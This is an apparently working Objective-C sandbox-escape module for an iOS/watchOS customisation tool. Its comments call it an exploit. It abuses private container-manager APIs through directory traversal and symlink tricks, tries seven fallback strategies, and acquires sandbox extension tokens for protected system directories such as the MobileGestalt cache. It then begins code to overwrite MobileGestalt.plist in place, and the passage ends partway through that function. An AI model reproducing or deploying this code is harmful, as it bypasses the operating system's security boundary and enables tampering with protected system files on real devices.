#import "BQCore.h"
#import <dlfcn.h>
#import <zlib.h>
#import <CoreFoundation/CoreFoundation.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <sys/mount.h>
#import <sys/fsgetpath.h>
#import <dirent.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>
#import <stdlib.h>
#import <objc/message.h>
#import <WatchKit/WatchKit.h>

NSString * const BQErrorDomain = @"BQErrorDomain";
NSString * const BQNoSandboxTokenError = @"the MCM query returned no sandbox token — send Documents/bqtool.log";

static NSString * const kMGGroup = @"systemgroup.com.apple.mobilegestaltcache";
static NSString * const kMGCaches = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
static NSString * const kPBCollections = @"com.apple.WallpaperKit.CollectionsPoster";
static NSString * const kPBCollectionsModern = @"com.apple.Posters.CollectionsPosterApp";
static NSString * const kPBMercury = @"com.apple.MercuryPoster";
static NSString * const kPBPhotos = @"com.apple.PhotosUIPrivate.PhotosPosterProvider";
static NSString * const kPBExtVersion = @"61";

// ---------------------------------------------------------------- logging ---
static NSString *gLogPath;
static NSLock *gLogLock;
static NSString *gGroupRoot;
static NSString *gGroupID;
static NSArray<NSString *> *gGroupIDs;
static NSString *gEscapeGroupRoot;
static int gTraversalState; // 0 unknown, 1 works, -1 unsupported
static BOOL gClass2ParentEnabled;
static NSString *gClass2SubpathLink;
static dispatch_queue_t gWorkQueue;

BOOL BQClass2ParentEnabled(void) { return gClass2ParentEnabled; }

void BQSetClass2ParentEnabled(BOOL on) {
    gClass2ParentEnabled = on;
    [[NSUserDefaults standardUserDefaults] setBool:on forKey:@"BQClass2ParentEnabled"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    BQLog(@"class2-parent enabled=%d", on);
}

NSString *BQLogPath(void) {
    if (!gLogPath) {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        gLogPath = [docs stringByAppendingPathComponent:@"bqtool.log"];
    }
    return gLogPath;
}

void BQLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[bqtool] %@", s);
    static dispatch_once_t once;
    dispatch_once(&once, ^{ gLogLock = [NSLock new]; });
    [gLogLock lock];
    NSString *path = BQLogPath();
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) [fm createFileAtPath:path contents:nil attributes:nil];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (fh) {
        @try {
            [fh seekToEndOfFile];
            [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
            [fh synchronizeFile];
        } @catch (__unused NSException *e) {}
        [fh closeFile];
    }
    [gLogLock unlock];
}

NSString *BQDocuments(void) {
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
}

NSString *BQGroupID(void) {
    if (!gGroupID) {
        // Read the app's own entitlements via SecTask. This lets the exploit use
        // whatever app group the running build actually has, instead of a
        // hardcoded identifier.
        void *sec = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
        typedef CFTypeRef (*create_fn)(CFAllocatorRef);
        typedef CFTypeRef (*copy_ent_fn)(CFTypeRef, CFStringRef, CFErrorRef *);
        create_fn create = (create_fn)dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
        if (!create && sec) create = (create_fn)dlsym(sec, "SecTaskCreateFromSelf");
        copy_ent_fn copy = (copy_ent_fn)dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
        if (!copy && sec) copy = (copy_ent_fn)dlsym(sec, "SecTaskCopyValueForEntitlement");
        if (create && copy) {
            CFTypeRef task = create(kCFAllocatorDefault);
            if (task) {
                CFTypeRef val = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
                if (val) {
                    if (CFGetTypeID(val) == CFArrayGetTypeID()) {
                        CFArrayRef arr = (CFArrayRef)val;
                        NSMutableArray *all = [NSMutableArray array];
                        for (CFIndex i = 0; i < CFArrayGetCount(arr); i++) {
                            CFTypeRef x = CFArrayGetValueAtIndex(arr, i);
                            if (x && CFGetTypeID(x) == CFStringGetTypeID()) {
                                [all addObject:[(__bridge NSString *)x copy]];
                            }
                        }
                        if (all.count) {
                            gGroupIDs = [all copy];
                            gGroupID = all.firstObject;
                        }
                    } else if (CFGetTypeID(val) == CFStringGetTypeID()) {
                        NSString *s = [(__bridge NSString *)val copy];
                        if (s.length) {
                            gGroupIDs = @[s];
                            gGroupID = s;
                        }
                    }
                    CFRelease(val);
                }
                CFRelease(task);
            }
        }
        if (!gGroupID) {
            NSString *defaultGroup = [NSString stringWithFormat:@"group.%@", [[NSBundle mainBundle] bundleIdentifier]];
            if ([[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:defaultGroup]) {
                gGroupID = defaultGroup;
                gGroupIDs = @[defaultGroup];
            } else if ([[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.com.kamui.escape"]) {
                gGroupID = @"group.com.kamui.escape";
                gGroupIDs = @[@"group.com.kamui.escape"];
            }
        }
        BQLog(@"app group entitlement: %@", gGroupID ?: @"(none)");
    }
    return gGroupID;
}

NSString *BQGroupRoot(void) {
    if (!gGroupRoot) {
        NSString *group = BQGroupID();
        if (group.length) {
            NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
            gGroupRoot = u.path;
        }
    }
    return gGroupRoot;
}

NSArray<NSString *> *BQGroupIDs(void) {
    BQGroupID();
    return gGroupIDs ?: @[];
}

dispatch_queue_t BQWorkQueue(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gWorkQueue = dispatch_queue_create("com.bqtool.work", DISPATCH_QUEUE_SERIAL);
    });
    return gWorkQueue;
}

// --------------------------------------------------------------- MCM API ---
#if __has_include(<xpc/xpc.h>)
#import <xpc/xpc.h>
#else
typedef void *xpc_object_t;
#endif
typedef xpc_object_t (*xpc_string_create_fn)(const char *);
typedef void (*xpc_release_fn)(xpc_object_t);
typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, xpc_object_t);
typedef void (*fn_set_cstr)(void *, const char *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_str)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_err)(void *);
typedef const char *(*fn_err_msg)(void *);
typedef int (*fn_err_int)(void *);

typedef struct {
    void *h;
    fn_create create;
    fn_set_u64 set_class;
    fn_set_obj set_ids;
    fn_set_obj set_group_ids;
    fn_set_u64 set_flags;
    fn_set_u64 set_part;
    fn_set_cstr set_domain;
    fn_get_one get_one;
    fn_copy_str copy_token;
    fn_get_path get_path;
    fn_free query_free;
    fn_consume consume;
    fn_release release;
    fn_err last_error;
    fn_err_msg err_message;
    fn_err_int err_posix;
} mcm_t;

static mcm_t g;
static xpc_string_create_fn p_xpc_string_create;
static xpc_release_fn p_xpc_release;

static void *bq_sym(void *h, const char *a, const char *b) {
    void *p = dlsym(h, a);
    if (!p && b) p = dlsym(h, b);
    return p;
}

static void bq_load_mcm(void) {
    if (g.create) return;
    memset(&g, 0, sizeof(g));
    g.h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!g.h) {
        BQLog(@"dlopen MCM failed: %s", dlerror());
        return;
    }
    g.create = (fn_create)bq_sym(g.h, "container_query_create", NULL);
    g.set_class = (fn_set_u64)bq_sym(g.h, "container_query_set_class", NULL);
    g.set_ids = (fn_set_obj)bq_sym(g.h, "container_query_set_identifiers", NULL);
    g.set_group_ids = (fn_set_obj)bq_sym(g.h, "container_query_set_group_identifiers", NULL);
    g.set_flags = (fn_set_u64)bq_sym(g.h, "container_query_operation_set_flags", "container_query_set_flags");
    g.set_part = (fn_set_u64)bq_sym(g.h, "container_query_operation_set_part", "container_query_set_part");
    g.set_domain = (fn_set_cstr)bq_sym(g.h, "container_query_operation_set_part_domain", "container_query_set_part_domain");
    g.get_one = (fn_get_one)bq_sym(g.h, "container_query_get_single_result", NULL);
    g.copy_token = (fn_copy_str)bq_sym(g.h, "container_copy_sandbox_token", NULL);
    g.get_path = (fn_get_path)bq_sym(g.h, "container_object_get_path", NULL);
    g.query_free = (fn_free)bq_sym(g.h, "container_query_free", NULL);
    g.consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    g.release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    g.last_error = (fn_err)bq_sym(g.h, "container_query_get_last_error", NULL);
    g.err_message = (fn_err_msg)bq_sym(g.h, "container_error_get_message", NULL);
    g.err_posix = (fn_err_int)bq_sym(g.h, "container_error_get_posix_errno", NULL);
    p_xpc_string_create = (xpc_string_create_fn)dlsym(RTLD_DEFAULT, "xpc_string_create");
    p_xpc_release = (xpc_release_fn)dlsym(RTLD_DEFAULT, "xpc_release");
    BQLog(@"MCM loaded=%d create=%p get=%p token=%p consume=%p release=%p",
          g.h != NULL, g.create, g.get_one, g.copy_token, g.consume, g.release);
}

static void bq_log_query_error(void *q, NSString *where) {
    if (!q || !g.last_error) return;
    void *e = g.last_error(q);
    if (!e) return;
    int posix = g.err_posix ? g.err_posix(e) : 0;
    const char *msg = g.err_message ? g.err_message(e) : NULL;
    BQLog(@"%@: last_error posix=%d msg=%s", where, posix, msg ? msg : "(null)");
}

// ---------------------------------------------------------- fs primitives ---
static void bq_recover(NSString *path, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:bak]) return;
    [fm removeItemAtPath:path error:nil];
    NSError *e = nil;
    if (![fm moveItemAtPath:bak toPath:path error:&e]) {
        BQLog(@"recover %@ -> %@ failed: %@", bak, path, e);
    }
}

static BOOL bq_swap_path(NSString *path, NSString *target, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:bak error:nil];
    if ([fm fileExistsAtPath:path]) {
        NSError *e = nil;
        if (![fm moveItemAtPath:path toPath:bak error:&e]) {
            BQLog(@"swap move %@ -> %@ failed: %@", path, bak, e);
            return NO;
        }
    }
    unlink(path.fileSystemRepresentation);
    errno = 0;
    int r = symlink(target.fileSystemRepresentation, path.fileSystemRepresentation);
    if (r != 0) {
        BQLog(@"symlink %@ -> %@ failed errno=%d (%s)", path, target, errno, strerror(errno));
        if ([fm fileExistsAtPath:bak]) [fm moveItemAtPath:bak toPath:path error:nil];
        return NO;
    }
    return YES;
}

static void bq_restore_path(NSString *path, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if ([fm fileExistsAtPath:bak]) {
        [fm removeItemAtPath:path error:nil];
        NSError *e = nil;
        if (![fm moveItemAtPath:bak toPath:path error:&e]) {
            BQLog(@"restore %@ -> %@ failed: %@", bak, path, e);
        }
    } else {
        if ([fm fileExistsAtPath:path]) {
            struct stat st;
            if (lstat(path.fileSystemRepresentation, &st) == 0 && S_ISLNK(st.st_mode)) {
                [fm removeItemAtPath:path error:nil];
            }
        }
        if (![fm fileExistsAtPath:path]) {
            [fm createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:nil];
        }
    }
}

// bad_query_list-style inode enumeration.
static char *bq_list(const char *path, int64_t max_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;
    size_t cap = 65536, length = 0, path_length = strlen(path);
    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';
    char buf[1200];
    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;
        size_t need = strlen(p) + 2;
        if (length + need > cap) {
            cap *= 2;
            char *t = realloc(out, cap);
            if (!t) break;
            out = t;
        }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}

// ------------------------------------------------------------------ init ---
BOOL BQCoreInit(void) {
    static dispatch_once_t once;
    static BOOL ok = NO;
    dispatch_once(&once, ^{
        NSString *docs = BQDocuments();
        [[NSFileManager defaultManager] createDirectoryAtPath:[docs stringByAppendingPathComponent:@"tendies"]
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        [[NSFileManager defaultManager] createDirectoryAtPath:[docs stringByAppendingPathComponent:@"PosterBoard/Wallpapers"]
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        if (gLogPath) [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];
        NSUserDefaults *defs = [NSUserDefaults standardUserDefaults];
        gClass2ParentEnabled = [defs boolForKey:@"BQClass2ParentEnabled"];
        if (gClass2ParentEnabled && [defs boolForKey:@"BQClass2ParentCrashGuard"]) {
            gClass2ParentEnabled = NO;
            [defs setBool:NO forKey:@"BQClass2ParentEnabled"];
            [defs setBool:NO forKey:@"BQClass2ParentCrashGuard"];
            [defs synchronize];
            BQLog(@"class2-parent disabled after a previous attempt did not finish");
        } else if (gClass2ParentEnabled) {
            [defs setBool:YES forKey:@"BQClass2ParentCrashGuard"];
            [defs synchronize];
        } else {
            [defs setBool:NO forKey:@"BQClass2ParentCrashGuard"];
        }
        BQLog(@"=== BQEscape start | iOS %@ | bundle %@ ===",
              [WKInterfaceDevice currentDevice].systemVersion, [[NSBundle mainBundle] bundleIdentifier]);
        bq_load_mcm();
        NSString *gid = BQGroupID();
        NSString *root = BQGroupRoot();
        BQLog(@"app group: id=%@ root=%@", gid ?: @"(none)", root ?: @"(none)");
        ok = (g.create && g.get_one && g.copy_token && g.consume && g.release);
        BQLog(@"core init ok=%d", ok);
    });
    return ok;
}

// ---------------------------------------------------------------- escape ---
static NSString *bq_dots(int n) {
    NSMutableArray *a = [NSMutableArray array];
    for (int i = 0; i < n; i++) [a addObject:@".."];
    return [a componentsJoinedByString:@"/"];
}

static int64_t bq_query_escape(uint64_t cls, NSString *ident, BOOL group,
                               uint64_t part, NSString *domain, uint64_t flags,
                               NSString *label, NSString **outPath) {
    if (!g.create || !ident.length) return -1;
    void *q = g.create();
    if (!q) return -2;
    g.set_class(q, cls);
    xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(ident.UTF8String) : NULL;
    if (group && g.set_group_ids) g.set_group_ids(q, x);
    else if (g.set_ids) g.set_ids(q, x);
    else if (g.set_group_ids) g.set_group_ids(q, x);
    if (g.set_part) g.set_part(q, part);
    if (domain.length && g.set_domain) g.set_domain(q, domain.UTF8String);
    if (g.set_flags) g.set_flags(q, flags);
    if (x && p_xpc_release) p_xpc_release(x);

    void *res = g.get_one(q);
    NSString *path = nil;
    if (res && g.get_path) {
        const char *cp = g.get_path(res);
        if (cp) path = [NSString stringWithUTF8String:cp];
    }
    char *tok = (res && g.copy_token) ? g.copy_token(res) : NULL;
    int64_t h = (tok && g.consume) ? g.consume(tok) : -5;
    BQLog(@"strategy %@: cls=%llu ident=%@ part=%llu result=%p path=%@ token=%s consume=%lld",
          label, cls, ident, part, res, path ?: @"(null)", tok ? "YES" : "NO", (long long)h);
    if (!res) bq_log_query_error(q, label);
    if (tok) free(tok);
    g.query_free(q);
    if (h >= 0 && outPath) *outPath = path;
    return h;
}

// Class 2 (the app's own data container) has one more door: the sandbox
// refuses to rename the part directories themselves (Library/Caches, Documents,
// tmp, ...), but the parent Library directory can be renamed on some builds.
// Move it aside, recreate a small Library with a symlinked Caches, query class 2
// and restore the original Library immediately. The token remains valid for the
// resolved target.
// Class 2 subpath symlink: create a symlink inside the app's own
// Library/Caches and ask MCM for part 3 with a non-empty partDomain. This
// keeps Library in place (no process-killing rename) and may make the daemon
// resolve the symlink while issuing the extension. Safe to attempt: only a
// temporary symlink inside Caches is touched.
static int64_t bq_escape_class2_subpath(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length) return -6;
    if (!g.set_domain) return -1;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *leaf = [NSString stringWithFormat:@".bq_link_%d", getpid()];
    NSString *link = [caches stringByAppendingPathComponent:leaf];
    unlink(link.fileSystemRepresentation);
    if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) != 0) {
        BQLog(@"class2-subpath: symlink failed errno=%d (%s)", errno, strerror(errno));
        return -2;
    }

    NSArray *domains = @[
        leaf,
        [@"Caches/" stringByAppendingString:leaf],
        [@"Library/Caches/" stringByAppendingString:leaf],
    ];
    int64_t last = -1;
    for (NSString *domain in domains) {
        NSString *path = nil;
        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8100000000ULL,
                                    [@"class2-subpath-" stringByAppendingString:domain], &path);
        if (h >= 0) {
            // A token for the symlink path is not enough: the editor needs the
            // resolved target. Verify before reporting success.
            DIR *d = opendir(target.fileSystemRepresentation);
            if (!d) {
                BQLog(@"class2-subpath: token did not open target (%@)", path ?: @"(null)");
                if (g.release) g.release(h);
                last = -5;
                continue;
            }
            closedir(d);
            unlink(link.fileSystemRepresentation);
            if (linkOut) *linkOut = target;
            BQLog(@"escape: using class2 subpath (%@) path=%@", domain, path ?: @"(null)");
            return h;
        }
        last = h;
    }
    unlink(link.fileSystemRepresentation);
    return last;
}

// Class 2 staged symlink: put a tiny fake tree inside the app's own
// Library/Caches, then use partDomain so MCM appends "Library/Caches" behind a
// symlink that resolves to the target. No Library move and no app group.
static int64_t bq_escape_class2_stage(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length || !g.set_domain) return -6;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *tag = [NSString stringWithFormat:@".bq_stage_%d", getpid()];
    NSString *stage = [caches stringByAppendingPathComponent:tag];
    NSString *link = [caches stringByAppendingPathComponent:
                      [NSString stringWithFormat:@".bq_slink_%d", getpid()]];
    NSString *stageLib = [stage stringByAppendingPathComponent:@"Library"];
    NSString *stageCaches = [stageLib stringByAppendingPathComponent:@"Caches"];

    [fm removeItemAtPath:stage error:nil];
    unlink(link.fileSystemRepresentation);
    if (![fm createDirectoryAtPath:stageLib withIntermediateDirectories:YES attributes:nil error:nil]) return -2;
    if (symlink(target.fileSystemRepresentation, stageCaches.fileSystemRepresentation) != 0) {
        [fm removeItemAtPath:stage error:nil];
        return -2;
    }
    if (symlink(stage.fileSystemRepresentation, link.fileSystemRepresentation) != 0) {
        unlink(stageCaches.fileSystemRepresentation);
        [fm removeItemAtPath:stage error:nil];
        return -2;
    }

    NSArray *domains = @[
        [@"Library/Caches/" stringByAppendingString:link.lastPathComponent],
        [@"Caches/" stringByAppendingString:link.lastPathComponent],
        link.lastPathComponent,
    ];
    int64_t last = -1;
    for (NSString *domain in domains) {
        NSString *path = nil;
        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8100000000ULL,
                                    [@"class2-stage-" stringByAppendingString:domain], &path);
        if (h >= 0) {
            DIR *d = opendir(target.fileSystemRepresentation);
            if (!d) {
                BQLog(@"class2-stage: token did not open target (%@)", path ?: @"(null)");
                if (g.release) g.release(h);
                last = -5;
                continue;
            }
            closedir(d);
            unlink(link.fileSystemRepresentation);
            unlink(stageCaches.fileSystemRepresentation);
            rmdir(stageLib.fileSystemRepresentation);
            rmdir(stage.fileSystemRepresentation);
            if (linkOut) *linkOut = target;
            BQLog(@"escape: using class2 stage (%@) path=%@", domain, path ?: @"(null)");
            return h;
        }
        last = h;
    }
    unlink(link.fileSystemRepresentation);
    unlink(stageCaches.fileSystemRepresentation);
    rmdir(stageLib.fileSystemRepresentation);
    rmdir(stage.fileSystemRepresentation);
    return last;
}

static int64_t bq_escape_class2_parent(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length) return -6;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
    NSString *bak = [home stringByAppendingPathComponent:@"Library.bqtool"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];

    // Recover an interrupted attempt. A stale backup is only safe to restore
    // when the live Library is missing or is our temporary Caches symlink.
    if ([fm fileExistsAtPath:bak]) {
        struct stat st;
        BOOL temp = ([fm fileExistsAtPath:lib] &&
                     lstat(caches.fileSystemRepresentation, &st) == 0 &&
                     S_ISLNK(st.st_mode));
        if (temp || ![fm fileExistsAtPath:lib]) {
            bq_restore_path(lib, bak);
        } else {
            BQLog(@"class2-parent: stale %@ exists; refusing to touch %@", bak, lib);
            return -2;
        }
    }
    if (![fm fileExistsAtPath:lib]) return -2;

    NSError *e = nil;
    if (![fm moveItemAtPath:lib toPath:bak error:&e]) {
        BQLog(@"class2-parent: move Library -> bak failed: %@", e);
        return -2;
    }
    if (![fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:&e]) {
        BQLog(@"class2-parent: recreate Library failed: %@", e);
        [fm moveItemAtPath:bak toPath:lib error:nil];
        return -2;
    }
    if (symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation) != 0) {
        BQLog(@"class2-parent: symlink Caches failed errno=%d (%s)", errno, strerror(errno));
        bq_restore_path(lib, bak);
        return -2;
    }

    NSString *path = nil;
    int64_t h = bq_query_escape(2, bid, NO, 3, @"", 0x8100000000ULL,
                                @"class2-parent", &path);
    // Restore the real Library before returning. Remove the symlink first so a
    // recursive directory removal can never walk into the target.
    unlink(caches.fileSystemRepresentation);
    rmdir(lib.fileSystemRepresentation);
    NSError *re = nil;
    if (![fm moveItemAtPath:bak toPath:lib error:&re]) {
        BQLog(@"class2-parent: restore Library failed: %@", re);
        bq_restore_path(lib, bak);
    }
    if (h >= 0) {
        DIR *d = opendir(target.fileSystemRepresentation);
        if (!d) {
            BQLog(@"class2-parent: token did not open target");
            if (g.release) g.release(h);
            return -5;
        }
        closedir(d);
        if (linkOut) *linkOut = target;
        BQLog(@"escape: using class2 parent -> %@", target);
        return h;
    }
    return h;
}

static int64_t bq_escape_symlink(NSString *target, NSString **linkOut) {
    NSArray<NSString *> *ids = BQGroupIDs();
    if (!ids.count) return -6;
    NSFileManager *fm = [NSFileManager defaultManager];
    int64_t last = -6;
    for (NSString *gid in ids) {
        NSURL *u = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
        NSString *groot = u.path;
        if (!groot.length) continue;
        NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
        NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
        NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
        [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
        bq_recover(lib, [groot stringByAppendingPathComponent:@"Library.bq_orig"]);
        bq_recover(caches, bak);
        if (![fm fileExistsAtPath:caches]) {
            [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
        }
        if (!bq_swap_path(caches, target, bak)) {
            bq_restore_path(caches, bak);
            last = -2;
            continue;
        }
        NSString *path = nil;
        int64_t h = bq_query_escape(7, gid, YES, 3, @"", 0x8100000000ULL,
                                    [@"class7-symlink/" stringByAppendingString:gid], &path);
        if (h >= 0) {
            gEscapeGroupRoot = groot;
            if (linkOut) *linkOut = caches;
            return h;
        }
        bq_restore_path(caches, bak);
        last = h;
    }
    return last;
}

int64_t BQEscape(NSString *target, NSString **linkOut) {
    if (!target.length) return -1;
    bq_load_mcm();
    int64_t last = -1;

    // 1. Old bad_query: class 13 + part-domain traversal. No app group needed.
    //    Works on builds where the traversal is not patched (27.0.x), fails on 27.2.
    if (gTraversalState >= 0 && target.isAbsolutePath) {
        NSString *dom = [bq_dots(12) stringByAppendingString:target];
        NSString *p = nil;
        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, dom, 0x8100000000ULL,
                                    @"class13-traversal", &p);
        if (h >= 0) {
            gTraversalState = 1;
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class13 traversal -> %@", p ?: target);
            return h;
        }
        gTraversalState = -1;
        last = h;
    }

    // 2. App-group part-directory symlink (27.2).
    NSString *gid = BQGroupID();
    if (gid.length) {
        NSString *link = nil;
        int64_t h = bq_escape_symlink(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link;
            BQLog(@"escape: using class7 symlink");
            return h;
        }
        last = h;
    }

    // 3. Class 2 staged symlink: a fake Library/Caches tree inside the app's
    //    Caches, resolved through a partDomain symlink. Safe and no app group.
    {
        NSString *link = nil;
        int64_t h = bq_escape_class2_stage(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 stage");
            return h;
        }
        last = h;
    }

    // 4. Class 2 symlink inside the existing Library/Caches. This is safe and
    //    needs no app group; it only works if MCM follows a relative symlink in
    //    partDomain without rejecting the resolved target.
    {
        NSString *link = nil;
        int64_t h = bq_escape_class2_subpath(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 subpath");
            return h;
        }
        last = h;
    }

    // 5. Class 2 parent-directory symlink. No app group needed: move the app's
    //    Library aside, create Library/Caches -> target, query the app's own
    //    container (class 2), then restore Library. Off by default: some builds
    //    kill the process for moving Library, so this is opt-in from Settings.
    if (gClass2ParentEnabled) {
        NSString *link = nil;
        int64_t h = bq_escape_class2_parent(target, &link);
        [[NSUserDefaults standardUserDefaults] setBool:NO forKey:@"BQClass2ParentCrashGuard"];
        [[NSUserDefaults standardUserDefaults] synchronize];
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 parent");
            return h;
        }
        last = h;
    } else {
        BQLog(@"class2-parent disabled (enable in Settings if there is no app group)");
    }

    // 6. Class 13 direct MobileGestalt query (some 27.0.x builds).
    if ([target isEqualToString:kMGCaches]) {
        NSString *p = nil;
        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8100000000ULL,
                                    @"class13-direct", &p);
        if (h >= 0) {
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class13 direct");
            return h;
        }
        last = h;
    }

    // 7. Class 12 geod part-domain traversal (older builds).
    if (target.isAbsolutePath) {
        NSString *dom = [bq_dots(12) stringByAppendingString:target];
        NSString *p = nil;
        int64_t h = bq_query_escape(12, @"com.apple.geod", NO, 3, dom, 0x8100000000ULL,
                                    @"class12-geod-traversal", &p);
        if (h >= 0) {
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class12 geod traversal");
            return h;
        }
        last = h;
    }

    BQLog(@"escape: all strategies failed (last=%lld) target=%@", (long long)last, target);
    return last;
}

static NSString *bq_escape_error(int64_t h) {
    if (h == -6) {
        return NSLocalizedString(@"no app group — open Settings → Class-2 fallback (experimental), enable it, then retry", nil);
    }
    if (h == -2) {
        return NSLocalizedString(@"class-2 fallback could not move Library — this build needs an app group on 27.2", nil);
    }
    if (h == -5) {
        return BQNoSandboxTokenError;
    }
    return [NSString stringWithFormat:NSLocalizedString(@"escape failed (%lld)", nil), (long long)h];
}

void BQEndEscape(int64_t handle) {
    if (handle >= 0 && g.release) g.release(handle);
    if (gClass2SubpathLink.length) {
        unlink(gClass2SubpathLink.fileSystemRepresentation);
        gClass2SubpathLink = nil;
    }
    NSString *groot = gEscapeGroupRoot;
    gEscapeGroupRoot = nil;
    if (!groot.length) return;
    NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
    bq_restore_path(caches, bak);
}
// -------------------------------------------------------------- Gestalt ---
NSString *BQBackupPath(void) {
    return [BQDocuments() stringByAppendingPathComponent:@"OriginalGestalt.plist"];
}

BOOL BQBackupExists(void) {
    return [[NSFileManager defaultManager] fileExistsAtPath:BQBackupPath()];
}

NSString *BQMobileGestaltPath(void) {
    return [kMGCaches stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
}

BOOL BQInPlaceWrite(void) {
    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:@"BQInPlaceWrite"];
    return n ? n.boolValue : YES;
}

void BQSetInPlaceWrite(BOOL on) {
    [[NSUserDefaults standardUserDefaults] setBool:on forKey:@"BQInPlaceWrite"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    BQLog(@"in-place write = %d", on);
}

static BOOL bq_write_all(int fd, const uint8_t *buf, size_t len) {
    size_t off = 0;
    while (off < len) {
        ssize_t n = write(fd, buf + off, len - off);
        if (n <= 0) return NO;
        off += (size_t)n;
    }
    return YES;
}

static BOOL bq_write_data(NSString *path, NSData *data, NSString **err) {
    NSData *original = [NSData dataWithContentsOfFile:path];
    if (BQInPlaceWrite()) {
        int fd = open(path.fileSystemRepresentation, O_RDWR | O_CLOEXEC | O_NOFOLLOW);
